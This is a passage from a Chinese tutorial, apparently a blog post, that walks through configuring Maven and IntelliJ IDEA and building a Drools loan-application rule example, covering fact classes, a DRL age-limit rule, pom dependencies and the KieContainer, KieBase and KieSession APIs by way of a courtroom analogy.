<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9698979d00f44904a8082527007b7771~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=g0QiolLG%2FOgETQlKN0WDZB0a7H4%3D" alt="20260210123609.png" loading="lazy"/></p>
<p>可以将其<em>conf</em>目录下的settings.xml配置拷贝出来，放到用户路径的 <em>~/.m2</em> 下，在各个操作系统用户级别维护maven配置。参照<a href="https://link.juejin.cn?target=https%3A%2F%2Fmaven.aliyun.com%2Fmvn%2Fguide" target="_blank" title="https://maven.aliyun.com/mvn/guide" ref="nofollow noopener noreferrer">阿里云maven使用指南</a>中的maven镜像设置，修改下拷贝出来的<em>settings.xml</em>文件以加速maven相关工具、依赖的下载：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">...</span>&gt;</span>
...
  <span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span>  
    <span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span>
...
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
</code></pre>
<h3 data-id="heading-8">idea设置</h3>
<h4 data-id="heading-9">快捷键设置</h4>
<p>为了方便和统一后续的代码编辑和文件操作，设置idea快捷键为eclipse风格，同时对基本的代码补全操作重设快捷键，移除原先的<kbd>Ctrl</kbd>+<kbd>空格</kbd>（和windows输入法有冲突），这里设为<kbd>Alt</kbd> + <kbd>/</kbd>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21be077982294223a75bd3e435e5a15e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=j5j08tSU80S8fPHlkwNrADKNJMg%3D" alt="20260210072616.png" loading="lazy"/></p>
<h4 data-id="heading-10">类型自动导入设置</h4>
<p>因为官方示例代码基本无需我们手写，方便复制过来可以自动引入类型，做如下设置：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6181a34034349308554242b1834bc24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=pw1rawLZBNtd3mPvPPk9w7avd7w%3D" alt="20260210075910.png" loading="lazy"/></p>
<h2 data-id="heading-11">构建贷款申请rule示例</h2>
<h3 data-id="heading-12">下载官方示例源代码</h3>
<p>因为Drools并入了Apache的KIE组织，而近年在KIE组织下孵化出一个图标像老爹的Kogito项目，它是 KIE 下的一个云原生业务自动化项目，定位是“<strong>下一代业务自动化平台</strong>”，聚焦云原生开发、部署和执行，当然也提供了示例，github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fincubator-kie-kogito-examples" target="_blank" title="https://github.com/apache/incubator-kie-kogito-examples" ref="nofollow noopener noreferrer">github.com/apache/incu…</a>。这里我们找到最新稳定版分支：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7553bfd29ae8418994f4e363c583d5ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=3RSTm7nYSls6L7OrlVez0Mr6F%2BI%3D" alt="20260210122224.png" loading="lazy"/></p>
<p>从基于最新<code>10.1.x</code>版本的示例：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fincubator-kie-kogito-examples%2Ftree%2F10.1.x" target="_blank" title="https://github.com/apache/incubator-kie-kogito-examples/tree/10.1.x" ref="nofollow noopener noreferrer">incubator-kie-kogito-examples</a>地址下载源代码到本地。
这里咱们找到<em>kogito-java-examples</em>的<em>rules-embedded-mode-example</em>项目，参考它给咱们之前创建的基于maven构建的java项目集成贷款申请规则案例。
<strong>后续的练习以该官方示例代码从头搭建，大家自己动手，直接参考官方示例即可。</strong></p>
<h3 data-id="heading-13">从零开发规则</h3>
<h4 data-id="heading-14">用法院审理案件类比</h4>
<h5 data-id="heading-15">宏观理解规则</h5>
<p>法院系统 = Drools 规则引擎</p>
<ol>
<li>Fact（事实）= 诉讼材料/案件事实
<ul>
<li>原告提交的起诉书、证据材料</li>
<li>被告提交的答辩材料</li>
<li>这些是“事实”，是法官需要审查的内容</li>
</ul>
</li>
<li>规则（Rules）= 法律法规
<ul>
<li>《民法典》条款</li>
<li>《刑法》条文</li>
<li>这些是“规则”，法官用来判断事实是否符合法律</li>
</ul>
</li>
<li>规则引擎 = 法官/法院
<ul>
<li>法官拿到诉讼材料（Fact）</li>
<li>对照法律法规（规则）进行判断</li>
<li>做出判决（执行规则的动作）</li>
</ul>
</li>
</ol>
<h5 data-id="heading-16">法院流程 vs 规则引擎流程</h5>
<p>法院流程</p>
<ol>
<li>立案 → 法院受理案件，建立案件档案</li>
<li>提交材料 → 原告/被告提交诉讼材料</li>
<li>开庭审理 → 法官审查材料，对照法律条文</li>
<li>判决 → 做出判决结果</li>
</ol>
<p>规则引擎流程</p>
<ol>
<li>启动规则引擎（创建 KieSession）→ 相当于立案
<ul>
<li>建立了一个"案件处理流程"</li>
<li>准备开始处理</li>
</ul>
</li>
<li>插入 Fact → 相当于提交诉讼材料
<ul>
<li>把 Applicant(申请人)、LoanApplication(贷款申请) 放入工作内存</li>
</ul>
</li>
<li>执行规则（fireAllRules）→ 相当于开庭审理
<ul>
<li>规则引擎检查 Fact，匹配规则</li>
</ul>
</li>
<li>获取结果 → 相当于判决结果
<ul>
<li>从 Fact 中获取处理后的结果，如 approved(审核结果)、explanation(审核结果说明)</li>
</ul>
</li>
</ol>
<p>对应关系</p>

























<table><thead><tr><th>法院</th><th>规则引擎</th></tr></thead><tbody><tr><td>立案</td><td>启动规则引擎（创建 KieSession）</td></tr><tr><td>提交诉讼材料</td><td>插入 Fact</td></tr><tr><td>开庭审理</td><td>执行规则（fireAllRules）</td></tr><tr><td>判决结果</td><td>获取处理后的 Fact</td></tr></tbody></table>
<h4 data-id="heading-17">定义事实(Fact)类</h4>
<p>该案例中的事实类有两个：<code>Applicant</code>(申请人)和<code>LoanApplication</code>(贷款申请)，它们就是简单的<code>POJO</code>，存储事实数据。
<em>Applicant.java</em></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.zm626.rules;  
  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Applicant</span> {  
    <span class="hljs-comment">/** 申请人id */</span>
    <span class="hljs-keyword">private</span> String id;  
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;  
  
    <span class="hljs-comment">// 省略无参构造、有参构造、getter和setter</span>
}
</code></pre>
<p><em>LoanApplication.java</em></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.zm626.rules;  
  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoanApplication</span> {
	<span class="hljs-comment">/** 申请人id */</span>  
    <span class="hljs-keyword">private</span> String applicantId;
    <span class="hljs-comment">/** 审核结果说明 */</span>  
    <span class="hljs-keyword">private</span> String explanation;  
    <span class="hljs-comment">/** 审核结果 true-通过 false-不通过 */</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> approved;  
  
    <span class="hljs-comment">// 省略无参构造、有参构造、getter、setter和toString方法</span>
  
}
</code></pre>
<h4 data-id="heading-18">定义规则drl文件</h4>
<p>该文件用于定义规则集，也包括规则结果查询等。该<code>.drl</code>后缀的文件需要采用专门的编辑器打开，常见的有idea的drools插件以及vscode的相关插件</p>
<h5 data-id="heading-19">drl编辑器插件</h5>
<p><em>idea的drools插件</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e4411ba68f64c6599178479090ac954~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=a%2BGiNV6HSeaySyCmwsXsDaP6mhY%3D" alt="20260210190127.png" loading="lazy"/>
idea的drools插件对类型比较敏感，这种包中定义的类型无需导入，但idea的drl插件就不认账</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1eeda86e71cf47609425e4bef57a80bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=8g17mYbpR2FMOQx0eqhiyjQRtsc%3D" alt="20260210192624.png" loading="lazy"/></p>
<p><em>vscode的drl插件</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9392454ec3a64da3aa0079d38ad988b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=%2BdOrSF02P1nrnvTCv1fvPTlDhag%3D" alt="20260210191336.png" loading="lazy"/>
vscode的drl编辑器，有代码高亮和基本结构的输入提示，但不会细化到对类型检查</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78e28cd1097f4c2dac6a522d12d3f8f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=ky%2F0gA%2FWqQq7kS8aSrRxA0z%2BGV8%3D" alt="20260210192036.png" loading="lazy"/></p>
<blockquote>
<p>[!tip] drl语法问题定位技巧
个人觉得编辑drl不要被编辑器的校验束缚，推荐用语法检查容忍度更高的vscode插件，语法问题则通过kie相关编译插件来检查，看控制台的详细提示。具体后续会实践。</p>
</blockquote>
<h5 data-id="heading-20">drl规则文件示例</h5>
<p><em>resources/com/zm626/rules/loan-application-age-limit.drl</em></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.zm626.rules;  
<span class="hljs-comment">/* 以上指定规则文件的逻辑包路径，可以不和所在的资源包的物理包路径一致  
 但做成一致后，且规则包路径和java包路径一致，则可以免去同一个包下的Java类型导入  
 比如下面的类型导入可以不写，但是idea的插件又不能智能识别（要求显示导入）  
 */</span>  
<span class="hljs-keyword">import</span> com.zm626.rules.Applicant;  
<span class="hljs-keyword">import</span> com.zm626.rules.LoanApplication;  
  
<span class="hljs-comment">// 每个规则都有一个名字，名字在同一个规则库(KieBase)中唯一  </span>
<span class="hljs-comment">// 不加引号则不能出现一些特殊字符，变成字符串则无限制  </span>
rule <span class="hljs-string">"Underage"</span>  
  <span class="hljs-comment">// 规则执行的优先级，不加或者数字一样大则按定义顺序  </span>
  <span class="hljs-comment">// 可以显示指定优先级，数字越大越先执行，数值设置在整个KieBase中生效  </span>
  salience <span class="hljs-number">15</span>  
  <span class="hljs-comment">// 给规则分组，便于触发一个分组内的所有规则  </span>
  ruleflow-group <span class="hljs-string">"applicationGroup"</span>  
  when  
    <span class="hljs-comment">// 规则左半边（条件）用来匹配事实对象：$变量名: 类型( 属性声明、匹配表达式 )    // 这里匹配每个贷款申请对象，匹配到小于21岁的申请人，那么就不允许申请，并说明下是未成年人  </span>
    $application : LoanApplication( $applicantId: applicantId )  
    Applicant( id == $applicantId &amp;&amp; age &lt; <span class="hljs-number">21</span> )  
  then  
    <span class="hljs-comment">// 规则右半边（结论），对匹配的申请对象更新属性  </span>
    $application.setApproved( <span class="hljs-literal">false</span> );  
    $application.setExplanation( <span class="hljs-string">"Underage"</span> );  
end <span class="hljs-comment">// 规则单元结束标记，与rule成对出现</span>
</code></pre>
<h3 data-id="heading-21">规则引擎API实战</h3>
<h4 data-id="heading-22">pom中的规则依赖</h4>
<p>drools规则引擎与java项目整合，需要引入相关的依赖，依赖的版本可以由<code>drools-bom</code>来管理，因此可以在<em>pom.xml</em>中通过<code>&lt;dependencyManagement&gt;</code>标签定义要导入的<code>pom</code>类型的<code>bom</code>依赖。</p>
<p><em>pom.xml</em></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">...</span>&gt;</span>
...
	<span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>  
	    ...  
	    <span class="hljs-tag">&lt;<span class="hljs-name">version.org.drools</span>&gt;</span>10.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version.org.drools</span>&gt;</span>  
	<span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>  
	  
	<span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>  
	    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>        
		    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            
			    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  
	            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-bom<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
	            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${version.org.drools}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  
	            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>  
	            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>  
	        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    
	    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>
...
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
<p>运行该示例必备的几个最小依赖如下：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 编译.drl文件，提供 KieContainer、KieSession 等 API --&gt;</span>  
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-compiler<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  
  
<span class="hljs-comment">&lt;!-- 配合 drools-compiler 进行模型编译 --&gt;</span>  
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-model-compiler<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  
  
<span class="hljs-comment">&lt;!-- 支持规则中的表达式：age &lt; 21、id == $applicantId --&gt;</span>  
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-mvel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  
  
<span class="hljs-comment">&lt;!--  
    基于kmodule.xml构建KieSession需要，  
    且这里可以传递依赖drools-commands，因为用到相关API  
 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-xml-support<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>规则引起启动、执行到结果的输出，这里用日志框架向控制台打印信息，需要添加<code>slf4j</code>两个依赖：<code>API</code>依赖和一个简单的实现依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">...</span>&gt;</span>
...
  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>  
    ...
    <span class="hljs-tag">&lt;<span class="hljs-name">version.org.slf4j</span>&gt;</span>2.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version.org.slf4j</span>&gt;</span>  
  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
  ...
  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>  
    ... 
    <span class="hljs-comment">&lt;!-- Logging --&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${version.org.slf4j}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        
      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-simple<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${version.org.slf4j}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
...
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
<h4 data-id="heading-23">启动规则引擎</h4>
<p>先写一个主类的结构来实践引擎相关的<code>API</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.zm626.rules;
<span class="hljs-keyword">import</span> ...
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuleMain</span> {
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(RuleMain.class);
	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
		...
	}
}
</code></pre>
<h5 data-id="heading-24">KieServices</h5>
<p>看下<code>main</code>方法中的实现，首先获取规则服务的实例，它是API的调用入口，用来开启规则引擎。设计上采用了懒加载的单例创建形式。源码的这种设计值得我们好好学习，使用内部工厂来懒加载实例，后续我们会对其源码的设计做详细的解读。</p>
<p>现在你只需知道该Services组件，类似于法院的接待大厅/服务台，通过服务台统一访问各个部门，而不需要直接找每个部门。也就是利用门面模式来获取Drools规则引擎中的各种组件。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 规则服务入口，相当于到了法院大门口了，大厅服务人员就位</span>
<span class="hljs-type">KieServices</span> <span class="hljs-variable">kieServices</span> <span class="hljs-operator">=</span> KieServices.Factory.get();
</code></pre>
<h5 data-id="heading-25">KieContainer</h5>
<p>如果把Drools整个规则引擎比作法院系统（具有执行法律的能力），那么<code>KieContainer</code>则相当于法律库管理系统/档案管理部门（管理多个法律法规库的容器），这是全局共享的，也可以认为是规则引擎的全局规则容器。构建规则容器是一个重量级的操作，一般在应用启动时构建一次，然后可以被全局使用。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 获取规则容器</span>
<span class="hljs-type">KieContainer</span> <span class="hljs-variable">kieContainer</span> <span class="hljs-operator">=</span> kieServices.getKieClasspathContainer();
</code></pre>
<p><code>KieContainer</code>也是一个单例，内部采用<strong>DCL</strong>双重检查锁来实现的。
在启动时会尝试加载用户定义的规则资源，即便没有加载到也不会有任何报错，而当我们尝试从规则容器获取规则库（KieBase）时才会抛出错误。</p>
<h5 data-id="heading-26">KieBase</h5>
<p>我们说规则引擎这个大的法院系统将所有的规则交给kie容器来管理，而实际的存储规则的对应<em>KieBase</em>类型的对象。也就是说，规则容器(KieContainer)可以包含多个规则存储库(KieBase)。
用户可以对规则分组，分多个库来管理；也可以将所有规则默认放在一个库中。总之，要构建一个<em>KieBase</em>需要有一个规则模块配置文件，路径为<code>META-INFO/kmodule.xml</code>，内容可以为空：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>  
<span class="hljs-tag">&lt;<span class="hljs-name">kmodule</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>  
        <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.drools.org/xsd/kmodule"</span>&gt;</span>  
  
<span class="hljs-tag">&lt;/<span class="hljs-name">kmodule</span>&gt;</span>
</code></pre>
<p>这样会得到默认的一个规则库对象，咱们可以获取其信息：</p>
<pre><code class="hljs language-java" lang="java">...
<span class="hljs-comment">// 获取默认的规则库  </span>
<span class="hljs-type">KieBase</span> <span class="hljs-variable">kieBase</span> <span class="hljs-operator">=</span> kieContainer.getKieBase();  
logger.info(<span class="hljs-string">"------ kieBase packages: {}"</span>, kieBase.getKiePackages());
</code></pre>
<p>这里得到的包名会是一个集合，drools推荐对规则文件按包来组织结构，规则文件中头部用<code>package</code>关键字指定的逻辑包名尽量和在<code>resources</code>资源包下存储的物理包路径保持一致，以便交给kieBase进行很好的管理。</p>
<p>也可以对规则按照包路径分组后，划分给不同的规则库来管理，这样当应用中有多个业务模块，可以各自关注跟自己模块相关的业务规则，提高规则的加载和执行效率。比如：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">kmodule</span> <span class="hljs-attr">...</span>&gt;</span>  
  
    <span class="hljs-tag">&lt;<span class="hljs-name">kbase</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"loanRules"</span> <span class="hljs-attr">packages</span>=<span class="hljs-string">"com.zm626.rules.loan"</span>&gt;</span>  
        <span class="hljs-comment">&lt;!-- 贷款相关规则 --&gt;</span>  
    <span class="hljs-tag">&lt;/<span class="hljs-name">kbase</span>&gt;</span>  
  
    <span class="hljs-tag">&lt;<span class="hljs-name">kbase</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"creditRules"</span> <span class="hljs-attr">packages</span>=<span class="hljs-string">"com.zm626.rules.credit"</span>&gt;</span>  
        <span class="hljs-comment">&lt;!-- 信用相关规则 --&gt;</span>  
    <span class="hljs-tag">&lt;/<span class="hljs-name">kbase</span>&gt;</span>  
  
<span class="hljs-tag">&lt;/<span class="hljs-name">kmodule</span>&gt;</span>
</code></pre>
<p>对应的规则文件所在目录结构：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01491c695ecf4effa3530c54b8058cd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeWwj-WNtw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771559237&amp;x-signature=jMl5FCw5tVL0cbPC9Ohb1uP49cQ%3D" alt="20260211184113.png" loading="lazy"/></p>
<p>练习下获取某个规则库：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 获取规则库名称  </span>
<span class="hljs-comment">// 输出：[loanRules, creditRules]  </span>
logger.info(<span class="hljs-string">"------ 规则库名称：{}"</span>, kieContainer.getKieBaseNames());  
  
<span class="hljs-comment">// 获取某个规则库  </span>
<span class="hljs-type">var</span> <span class="hljs-variable">kb</span> <span class="hljs-operator">=</span> kieContainer.getKieBase(<span class="hljs-string">"loanRules"</span>);  
<span class="hljs-comment">// 输出：[[Package name=com.zm626.rules.loan]]  </span>
logger.info(<span class="hljs-string">"------ kieBase packages: {}"</span>, kb.getKiePackages());
</code></pre>
<h4 data-id="heading-27">执行规则</h4>
<h5 data-id="heading-28">规则会话</h5>
<h6 data-id="heading-29">创建KieSession</h6>
<p>创建好了规则引擎的容器、构建好规则库之后，就可以执行规则了，执行规则需要创建会话对象，就好比法庭审判会依据相关法律法规来开启一次庭审一样，会话的创建可以交给<code>KieBase</code>实例，</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">KieBase</span> <span class="hljs-variable">kieBase</span> <span class="hljs-operator">=</span> kieContainer.getKieBase();  
<span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieBase.newKieSession();  
<span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession2</span> <span class="hljs-operator">=</span> kieBase.newKieSession();  
<span class="hljs-comment">// 返回false，说明每次都是新new的一个会话实例  </span>
System.out.println(kieSession == kieSession2);
</code></pre>
<p>除此之外一般更推荐直接用<code>kieContainer</code>来开启会话，因为容器创建的会话，其实内部也是借助<code>kieBase</code>来创建的，但容器创建会开启对会话的监控和管理，这是在实际应用中推荐的做法。
对于默认的<code>kbase</code>，也就是<em>kmodule.xml</em>为空的情况，开启会话如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();
</code></pre>
<p>对于多<code>kbase</code>定义的情况，比如：
<em>kmodule.xml</em></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">kmodule</span> <span class="hljs-attr">...</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 贷款申请相关规则 --&gt;</span>  
    <span class="hljs-tag">&lt;<span class="hljs-name">kbase</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"loanRules"</span> <span class="hljs-attr">packages</span>=<span class="hljs-string">"com.zm626.rules"</span>&gt;</span>  
        <span class="hljs-comment">&lt;!-- 定义会话名称 --&gt;</span>  
        <span class="hljs-tag">&lt;<span class="hljs-name">ksession</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"loanSession"</span> /&gt;</span>  
    <span class="hljs-tag">&lt;/<span class="hljs-name">kbase</span>&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">kmodule</span>&gt;</span>
</code></pre>
<p>按照会话名称来开启会话</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession(<span class="hljs-string">"loanSession"</span>);  
</code></pre>
